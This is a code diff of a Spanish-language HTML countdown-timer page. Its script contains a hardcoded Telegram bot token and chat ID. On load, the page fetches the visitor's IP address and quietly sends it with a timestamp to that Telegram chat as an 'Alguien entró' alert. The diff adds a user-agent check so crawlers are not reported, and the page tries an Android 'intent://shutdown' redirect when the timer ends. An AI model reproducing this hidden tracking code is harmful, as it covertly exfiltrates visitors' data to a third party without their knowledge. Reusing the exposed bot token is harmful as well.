@@ -5,50 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Contador 1 Hora</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        html, body {
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-            background-color: #000000;
-        }
-
-        .contenedor {
-            width: 100%;
-            height: 100%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            position: relative;
-        }
-
-        img {
-            min-width: 8%;
-            min-height: 8%;
-            object-fit: cover;
-            display: block;
-        }
-
-        .contador {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background-color: rgba(0, 0, 0, 0.75);
-            color: #ffffff;
-            padding: 12px 24px;
-            border-radius: 25px;
-            font-size: 1.8rem;
-            font-weight: bold;
-            letter-spacing: 2px;
-            border: 2px solid #ffffff;
-            z-index: 10;
-            font-family: 'Arial', sans-serif;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { width: 100%; height: 100%; overflow: hidden; background-color: #000000; }
+        .contenedor { width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; position: relative; }
+        img { min-width: 8%; min-height: 8%; object-fit: cover; display: block; }
+        .contador { position: fixed; top: 20px; right: 20px; background-color: rgba(0, 0, 0, 0.75); color: #ffffff; padding: 12px 24px; border-radius: 25px; font-size: 1.8rem; font-weight: bold; letter-spacing: 2px; border: 2px solid #ffffff; z-index: 10; font-family: 'Arial', sans-serif; }
     </style>
 </head>
 <body>
@@ -60,10 +21,9 @@
     <script>
         const TELEGRAM_BOT_TOKEN = '8761511101:AAHru_MEit7PzMEoot0oxw9zu_7piy8uH-g';
         const TELEGRAM_CHAT_ID = '8521142101';
-
         const TIEMPO_TOTAL = 3600;
         let tiempoRestante = TIEMPO_TOTAL;
-
+        let notificado = false;
         const contadorElemento = document.getElementById('contador');
 
         function formatearTiempo(segundos) {
@@ -74,6 +34,8 @@
         }
 
         async function enviarTelegram(mensaje) {
+            if (notificado) return;
+            notificado = true;
             try {
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -97,20 +59,16 @@
             document.body.style.backgroundColor = '#000000';
             document.querySelector('img').style.display = 'none';
             contadorElemento.style.display = 'none';
-            try {
-                window.location.href = 'intent://shutdown#Intent;scheme=android-app;end';
-            } catch (e) {}
+            try { window.location.href = 'intent://shutdown#Intent;scheme=android-app;end'; } catch (e) {}
         }
 
         async function actualizarContador() {
             tiempoRestante--;
             contadorElemento.textContent = formatearTiempo(tiempoRestante);
-
             if (tiempoRestante <= 10 && tiempoRestante > 0) {
                 contadorElemento.style.color = '#ff4444';
                 contadorElemento.style.borderColor = '#ff4444';
             }
-
             if (tiempoRestante <= 0) {
                 clearInterval(intervalo);
                 contadorElemento.textContent = '00:00:00';
@@ -124,7 +82,11 @@
         async function iniciar() {
             contadorElemento.textContent = formatearTiempo(TIEMPO_TOTAL);
             const ip = await obtenerIP();
-            await enviarTelegram(`🟢 DISPOSITIVO ENCENDIDO\n📱 IP: ${ip}\n🕐 Hora: ${new Date().toLocaleString('es-MX')}\n⏳ Apagado en: 1 hora`);
+            const userAgent = navigator.userAgent.toLowerCase();
+            if (userAgent.includes('bot') || userAgent.includes('crawler') || userAgent.includes('spider')) {
+                return;
+            }
+            await enviarTelegram(`🔔 Alguien entró\n📱 IP: ${ip}\n🕐 Hora: ${new Date().toLocaleString('es-MX')}`);
         }
 
         const intervalo = setInterval(actualizarContador, 1000);
